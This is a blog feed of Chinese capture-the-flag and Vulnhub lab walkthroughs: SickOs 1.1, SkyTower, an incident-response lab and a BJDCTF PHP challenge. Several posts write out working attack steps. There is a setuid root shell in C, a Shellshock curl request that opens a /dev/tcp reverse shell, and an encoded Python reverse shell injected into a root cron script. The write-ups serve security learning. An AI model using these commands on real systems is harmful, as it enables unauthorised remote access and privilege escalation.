class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"sh"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>gcc shell.c -o &#x2F;tmp&#x2F;update</p></blockquote><p>之后运行update文件</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总体来说靶机有点意思，重要的几点就是PUT方式上传木马，反弹shell的时候端口的限用，使用chkrootkit的版本漏洞进行提权</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="靶场" scheme="http://3143047748.github.io/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>应急响应靶机训练-Web2</title>
    <link href="http://3143047748.github.io/2024/03/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA%E8%AE%AD%E7%BB%83-Web2/"/>
    <id>http://3143047748.github.io/2024/03/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA%E8%AE%AD%E7%BB%83-Web2/</id>
    <published>2024-03-16T07:01:13.000Z</published>
    <updated>2024-03-16T07:03:47.726Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/><h2 id="应急响应靶机训练-Web2"><a href="#应急响应靶机训练-Web2" class="headerlink" title="应急响应靶机训练-Web2"></a>应急响应靶机训练-Web2</h2><p>发现 知攻善防实验室公众号里有两个应急响应靶场，练习到了第二个，记录一下<a href="https://mp.weixin.qq.com/s/UHkPwopo0HZ330UKTJyXuw">应急响应靶机训练-Web2</a></p><h2 id="挑战内容"><a href="#挑战内容" class="headerlink" title="挑战内容"></a>挑战内容</h2><p>前景需要：小李在某单位驻场值守，深夜12点，甲方已经回家了，小李刚偷偷摸鱼后，发现安全设备有告警，于是立刻停掉了机器开始排查。</p><p>这是他的服务器系统，请你找出以下内容，并作为通关条件：</p><p>1.攻击者的IP地址（两个）？192.168.126.135&#x2F;</p><p>2.攻击者的webshell文件名？system.php</p><p>3.攻击者的webshell密码？hack6618</p><p>4.攻击者的伪QQ号？</p><p>5.攻击者的伪服务器IP地址？</p><p>6.攻击者的服务器端口？</p><p>7.攻击者是如何入侵的（选择题）？</p><p>8.攻击者的隐藏用户名？</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>在启动靶机时，如果你的vm版本为16，请将虚拟机的vmx文件改一下<br><img src="https://img-blog.csdnimg.cn/direct/3c01bc81e7db42c69300889a39d46927.png" alt="123"></p><p>之后就正常启动靶机了。<br>进入靶机之后先开启phpstudy的服务，然后根据问题寻找答案<br><img src="https://img-blog.csdnimg.cn/direct/e478544a47be41119959900ab91192b0.png" alt="1"><br>查看apache日志文件可以发现攻击者的一个ip为192.168.126.135，<img src="https://img-blog.csdnimg.cn/direct/6eb5a3d931a547c89916ea23d72e0c70.png" alt="13"></p><p>将源码拖出来使用D盾扫描得到木马文件system.php文件并且知道了密码<br><img src="https://img-blog.csdnimg.cn/direct/bad401e8c04143d0ad45c1985585813e.png" alt="132"><br>如果要查找隐藏用户，有几种方法：<br>1、查看注册表：win+R输入regedit即可看到隐藏用户<code>hack887$</code><br>2、打开控制面板-&gt;用户账户-&gt;管理账户</p><p>然后再文档文件下发现Tencent Files文件夹，看到QQ号<br><img src="https://img-blog.csdnimg.cn/direct/4bc0755d3ce04f5c8cac565d2f71ba84.png" alt="132"><br>打开QQ号文件下的FileRecv文件夹，看到了黑客上传的frp工具，查看配置文件frpc.ini文件</p><p><img src="https://img-blog.csdnimg.cn/direct/9f810b7962f14c7f810c950ccb133974.png" alt="465"></p><p>到这里还差一个攻击者的另一个ip，我是没找到，看了一下解题思路，另一个IP是使用蓝队工具箱的日志分析工具找到的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="靶场" scheme="http://3143047748.github.io/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub-sickos1.1</title>
    <link href="http://3143047748.github.io/2024/03/08/Vulnhub-sickos1-1/"/>
    <id>http://3143047748.github.io/2024/03/08/Vulnhub-sickos1-1/</id>
    <published>2024-03-08T03:13:59.000Z</published>
    <updated>2024-07-15T09:55:20.073Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近打的这两个靶场均涉及到代理，值得学习。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>使用nmap发现主机192.168.206.152。扫描开了三个端口22，8080，3128，信息如下：<br>:<img src="https://img-blog.csdnimg.cn/direct/ae48518e34cd41b2bace11afe01d6eff.png" alt="123"><br>当访问<code>192.168.206.152:8080</code>的时候发现无响应，8080端口显示的http代理关闭，3128端口是开放的，运行着 Squid HTTP 代理 3.1.19 版本。那么改变一下浏览器的代理就可以访问网站了。</p><p><img src="https://img-blog.csdnimg.cn/direct/98f1768860c146a5b3b4cff4e4a65422.png" alt="123"><br>然后访问<a href="http://192.168.206.152/%E3%80%82">http://192.168.206.152/。</a><br>尝试进行目录扫描，发现在使用kali进行目录扫描时并无响应<br><img src="https://img-blog.csdnimg.cn/direct/e5ead531f9134d7ea64dfd897ee0cf39.png" alt="123"></p><p>在扫描时也要通过代理：<code>dirsearch -u http://192.168.206.152/ --proxy http://192.168.206.152:3128</code>或者<code>dirb http://192.168.206.152/ -p http://192.168.206.152:3128</code><br>扫描到robots.txt,存在wolfcms目录<br><img src="https://img-blog.csdnimg.cn/direct/9fc16baeeadd44c39eead7dada2c2f8a.png" alt="123"><br>继续进行深度目录扫描，没有找到后台登陆入口，网上搜索一下相关漏洞:<a href="https://cloud.tencent.com/developer/article/1047292">Wolf CMS 新旧两个版本中的文件上传漏洞分析</a><br>找到后台入口&#x2F;wolfcms&#x2F;?&#x2F;admin，弱密码admin&#x2F;admin<br>在file下上传反弹shell的PHP文件<br><img src="https://img-blog.csdnimg.cn/direct/dd497660c3bf487fa0b7be670c61302d.png" alt="123"></p><p>kali开启监听6666，靶机访问该文件<code>http://192.168.206.152/wolfcms/public/shell.php</code><br><img src="https://img-blog.csdnimg.cn/direct/26ed64e38a5b4853a17b66f5c56e6885.png" alt="123"></p><p>找敏感文件，发现wolfcms&#x2F;config.php文件中存在数据库账号密码<br><img src="https://img-blog.csdnimg.cn/direct/d5fe75fb34fb4461bf42a05b1d6443c9.png" alt="123"><br>尝试进行连接发现无法连接，继续收集信息发现存在用户sickos，尝试使用数据库密码切换到该用户ssh远程登陆<br><img src="https://img-blog.csdnimg.cn/direct/f042fb306fc7439d8240dd07c363f71d.png" alt="123"><br>发现具有sudo所有权限<br><img src="https://img-blog.csdnimg.cn/direct/b6351fce09ef4499a6537657165a104c.png" alt="123"><br>直接sudo &#x2F;bin&#x2F;bash，拿到root权限<br><img src="https://img-blog.csdnimg.cn/direct/031d061fb5324d9db4fb41cf80fb3a36.png" alt="123"><br>至此结束！</p><h2 id="二解"><a href="#二解" class="headerlink" title="二解"></a>二解</h2><p>有发现网上有第二种解法，复现一下<br>他这里使用nikto扫描到漏洞<br><code>nikto -h 192.168.206.152 -useproxy http://192.168.206.152:3128</code><br><img src="https://img-blog.csdnimg.cn/direct/3cb32fd75d434632817244fdf89f3ac9.png" alt="798"></p><p>发现破壳漏洞cve-2014-6271</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>先检测漏洞是否存在<br><code>sudo curl -v --proxy http://192.168.206.152:3128 http://192.168.206.152/cgi-bin/status -H &quot;Referer:() &#123; test;&#125;; echo &#39;Content-Type: text/plain&#39;; echo; echo; /usr/bin/echo; exit&quot;&quot;</code><br><img src="https://img-blog.csdnimg.cn/direct/f0f51a6b375c4f4280e4e79d97ac8215.png" alt="123"></p><p>成功执行。</p><h3 id="shellshock漏洞利用"><a href="#shellshock漏洞利用" class="headerlink" title="shellshock漏洞利用"></a>shellshock漏洞利用</h3><h4 id="msfvenom反弹shell"><a href="#msfvenom反弹shell" class="headerlink" title="msfvenom反弹shell"></a>msfvenom反弹shell</h4><p>使用msf来生成反弹马<br><img src="https://img-blog.csdnimg.cn/direct/579ef83031714acbb7162a8a9c8751b4.png" alt="123"><br>执行命令：<code>curl -v --proxy http://192.168.206.152:3128 http://192.168.206.152/cgi-bin/status -H &quot;Referer:() &#123; test;&#125;; 0&lt;&amp;120-;exec 120&lt;&gt;/dev/tcp/192.168.206.138/6666;/bin/bash &lt;&amp;120 &gt;&amp;120 2&gt;&amp;120&quot;</code><br>如果一次不行可以多试几次，kali监听端口<code>nc -lnvp 6666</code><br>反弹成功后查看权限为www-data</p><h4 id="定时任务进行提权"><a href="#定时任务进行提权" class="headerlink" title="定时任务进行提权"></a>定时任务进行提权</h4><p>在&#x2F;var&#x2F;www目录下发现文件connect.py文件，而且文件权限是777<br><code>-rwxrwxrwx  1 root     root      109 Dec  5  2015 connect.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">print</span> <span class="token string">"I Try to connect things very frequently\n"</span><span class="token keyword">print</span> <span class="token string">"You may want to try my services"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>意思是涉及到定时任务？搜索一下，定时任务文件文件名通常带有<strong>cron</strong>，到&#x2F;etc目录下查找一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@SickOs:/etc$ <span class="token function">ls</span> <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"cron"</span><span class="token function">ls</span> <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"cron"</span>cron.dcron.dailycron.hourlycron.monthlycron.weekly<span class="token function">crontab</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后发现cron.d目录下的automate文件中内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@SickOs:/etc/cron.d$ <span class="token function">cat</span> auto*<span class="token function">cat</span> auto** * * * * root /usr/bin/python /var/www/connect.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>定时执行connect.py文件<br>msfvenom生成反弹shellpayload<br><code>msfvenom -p cmd/unix/reverse_python LHOST=192.168.206.138 LPORT=4444 -f raw</code><br><img src="https://img-blog.csdnimg.cn/direct/28429ce94bbc46aa8b8c96af7cfe01e7.png" alt="123"></p><p>写入文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@SickOs:/etc/cron.d$ <span class="token builtin class-name">echo</span> <span class="token string">"exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAgLCAgICBzdWJwcm9jZXNzICAgICAsICAgIG9zOyAgICAgICAgaG9zdD0iMTkyLjE2OC4yMDYuMTM4IjsgICAgICAgIHBvcnQ9NDQ0NDsgICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgLCAgICBzb2NrZXQuU09DS19TVFJFQU0pOyAgICAgICAgcy5jb25uZWN0KChob3N0ICAgICAsICAgIHBvcnQpKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAwKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAxKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAyKTsgICAgICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==')[0]))"</span> <span class="token operator">>></span> /var/www/connect.py<span class="token operator">&lt;</span>KCIvYmluL2Jhc2giKQ<span class="token operator">==</span><span class="token string">')[0]))" >> /var/www/connect.py                         www-data@SickOs:/etc/cron.d$ cat /var/www/connect.pycat /var/www/connect.py#!/usr/bin/pythonprint "I Try to connect things very frequently\n"print "You may want to try my services"exec(__import__('</span>base64<span class="token string">').b64decode(__import__('</span>codecs<span class="token string">').getencoder('</span>utf-8<span class="token string">')('</span>aW1wb3J0IHNvY2tldCAgICAgLCAgICBzdWJwcm9jZXNzICAgICAsICAgIG9zOyAgICAgICAgaG9zdD0iMTkyLjE2OC4yMDYuMTM4IjsgICAgICAgIHBvcnQ9NDQ0NDsgICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgLCAgICBzb2NrZXQuU09DS19TVFJFQU0pOyAgICAgICAgcy5jb25uZWN0KChob3N0ICAgICAsICAgIHBvcnQpKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAwKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAxKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAyKTsgICAgICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ<span class="token operator">==</span>'<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后kali监听4444端口，等待片刻。。。<br><img src="https://img-blog.csdnimg.cn/direct/b33aca2418054003a3ea827c420348af.png" alt="123"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="靶场" scheme="http://3143047748.github.io/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub-SKYTOWER</title>
    <link href="http://3143047748.github.io/2024/03/02/Vulnhub-SKYTOWER/"/>
    <id>http://3143047748.github.io/2024/03/02/Vulnhub-SKYTOWER/</id>
    <published>2024-03-02T08:12:30.000Z</published>
    <updated>2024-03-08T03:14:29.739Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>使用nmap扫描主机进行信息收集</p><blockquote><p>nmap 192.168.206.151 -p- -A -SV</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Starting Nmap <span class="token number">7.92</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-03-02 <span class="token number">14</span>:11 CSTStats: <span class="token number">0</span>:00:05 elapsed<span class="token punctuation">;</span> <span class="token number">0</span> hosts completed <span class="token punctuation">(</span><span class="token number">1</span> up<span class="token punctuation">)</span>, <span class="token number">1</span> undergoing SYN Stealth ScanSYN Stealth Scan Timing: About <span class="token number">7.96</span>% <span class="token keyword">done</span><span class="token punctuation">;</span> ETC: <span class="token number">14</span>:12 <span class="token punctuation">(</span><span class="token number">0</span>:00:23 remaining<span class="token punctuation">)</span>Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.206.151Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00070s latency<span class="token punctuation">)</span>.Not shown: <span class="token number">65532</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>PORT     STATE    SERVICE    VERSION<span class="token number">22</span>/tcp   filtered <span class="token function">ssh</span><span class="token number">80</span>/tcp   <span class="token function">open</span>     http       Apache httpd <span class="token number">2.2</span>.22 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span><span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">)</span>.<span class="token operator">|</span>_http-server-header: Apache/2.2.22 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span><span class="token number">3128</span>/tcp <span class="token function">open</span>     http-proxy Squid http proxy <span class="token number">3.1</span>.20<span class="token operator">|</span>_http-title: ERROR: The requested URL could not be retrieved<span class="token operator">|</span>_http-server-header: squid/3.1.20MAC Address: 00:0C:29:82:E8:ED <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Device type: general purposeRunning: Linux <span class="token number">3</span>.XOS CPE: cpe:/o:linux:linux_kernel:3OS details: Linux <span class="token number">3.2</span> - <span class="token number">3.10</span>, Linux <span class="token number">3.2</span> - <span class="token number">3.16</span>Network Distance: <span class="token number">1</span> hopTRACEROUTEHOP RTT     ADDRESS<span class="token number">1</span>   <span class="token number">0.70</span> ms <span class="token number">192.168</span>.206.151OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">40.61</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>信息整理：<br>开放端口：22（ssh） 80（http） 3128（代理端口）</p><h2 id="web页面"><a href="#web页面" class="headerlink" title="web页面"></a>web页面</h2><p>访问80端口进行目录扫描发现三个文件<br><img src="https://img-blog.csdnimg.cn/direct/51b00da8b31a487d9db8779f35d5f1cc.png" alt="123"><br>主页面是一个登录窗口<br><img src="https://img-blog.csdnimg.cn/direct/382e43ac70da4eca993b41258eb05430.png" alt="213"><br>尝试进行弱口令登录无果，测试SQL注入。<br>发现存在sql注入<br><img src="https://img-blog.csdnimg.cn/direct/5e8ab8649f634da29b8532146ff9682f.png" alt="123"><br>多次测试后发现可以成功登录<br><img src="https://img-blog.csdnimg.cn/direct/8930a7299c664de388f3ba4d37932f72.png" alt="456"><br>给出了账号密码<code>john/hereisjohn</code><br><img src="https://img-blog.csdnimg.cn/direct/67a0398fa2284aae8891c68881d059e1.png" alt="45"><br>使用该账号密码登录网页不行，ssh也无反应，想起收集信息时发现3128端口开启了代理，那么使用代理工具proxytunnel进行访问。</p><h2 id="proxytunnel"><a href="#proxytunnel" class="headerlink" title="proxytunnel"></a>proxytunnel</h2><p>proxytunnel是一款利用http connection封装技术建立隧道的工具。<br>适用条件<br>防火墙禁止DNS和ICMP隧道，只允许代理服务器上网的情景。</p><p>proxytunnel常用命令<br>-a                   指定本地侦听端口</p><p>-p                   使用代理</p><p>-r                    使用第二个代理</p><p>-d                   指定访问的目标和端口<br>kali自带该工具</p><blockquote><p><code>proxytunnel  -p 192.168.206.151:3128 -d 127.0.0.1:22 -a 6666</code></p></blockquote><p><img src="https://img-blog.csdnimg.cn/direct/9562b8ee604943e3ba8a07e2c8001a11.png" alt="123"></p><h2 id="连接ssh"><a href="#连接ssh" class="headerlink" title="连接ssh"></a>连接ssh</h2><p>开启建立后打开另一个终端进行ssh连接，发现连接上之后就会立即断开<br><img src="https://img-blog.csdnimg.cn/direct/134e48a161034a7583f63e5f25585fcf.png" alt="456"></p><p>涉及到了<code>.bashrc</code>文件，在加载shell的时候由于<code>.bashrc</code>文件的配置，bash 在每次启动时都会加载 .bashrc 文件的内容。每个用户的 home 目录都有这个 shell 脚本。它用来存储并加载你的终端配置和环境变量。<br>有可能<code>.bashrc</code>文件写有关闭shell的内容，这里有两个方法：<br>第一：删除.bashrc文件（有风险）<br>第二：使用-t 来开启一个终端</p><blockquote><p>ssh <a href="mailto:&#x6a;&#111;&#x68;&#110;&#x40;&#x31;&#50;&#55;&#46;&#x30;&#x2e;&#48;&#46;&#x31;">&#x6a;&#111;&#x68;&#110;&#x40;&#x31;&#50;&#55;&#46;&#x30;&#x2e;&#48;&#46;&#x31;</a> -p 6666 -t “&#x2F;bin&#x2F;&#x2F;sh” </p></blockquote><p>使用第二种<br>连接完成之后对靶机进行信息收集，找到login.php中存在数据库账号密码<br><img src="https://img-blog.csdnimg.cn/direct/80429c4272d7467bb82055fef168896a.png" alt="456"><br>连接数据库后发现另外两个用户，查看&#x2F;home下确实存在。<br><img src="https://img-blog.csdnimg.cn/direct/0eca6ffdb4534c6f9d9737e315693be4.png" alt="123"></p><p>sara可以连接，william不可以。连接后发现sara用户存在一定的root权限<br><img src="https://img-blog.csdnimg.cn/direct/f7fd2f112f864ce0bd1ae9d831d95ab0.png" alt="789"><br>查看root目录下的flag.txt文件发现有root密码<br><img src="https://img-blog.csdnimg.cn/direct/837b5f62fa1842188b881a0b00844608.png" alt="456"><br>连接ssh，拿到flag。<br><img src="https://img-blog.csdnimg.cn/direct/472f4411a17e45bbad93ea73a3468ef7.png" alt="456"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以SQL注入为入口找到账号密码，搭建代理隧道后连接ssh，在login.php文件下发现数据库账号密码。通过数据库查到其他用户的账号密码，发现sara用户存在root权限，在root下发现root密码，然后连接ssh拿到root下的flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="靶场" scheme="http://3143047748.github.io/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>BJDCTF2020-EzPHP</title>
    <link href="http://3143047748.github.io/2024/03/01/BJDCTF2020-EzPHP/"/>
    <id>http://3143047748.github.io/2024/03/01/BJDCTF2020-EzPHP/</id>
    <published>2024-03-01T11:29:38.000Z</published>
    <updated>2024-03-01T12:30:27.159Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/><h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>这道题真的不错哎😔，复现一下<br>打开题目后查看源码发现起那面有一段密文，base32解密后为一个文件名<strong>1nD3x.php</strong>，访问该文件：（看到大段的就像shi~~）<br>源码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1nD3x.php"</span><span class="token punctuation">;</span><span class="token variable">$shana</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br />&lt;font color=red>&lt;B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B>&lt;br>&lt;/font>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>          <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'debu_debu_aqua'</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Very good! you know my password. But what is 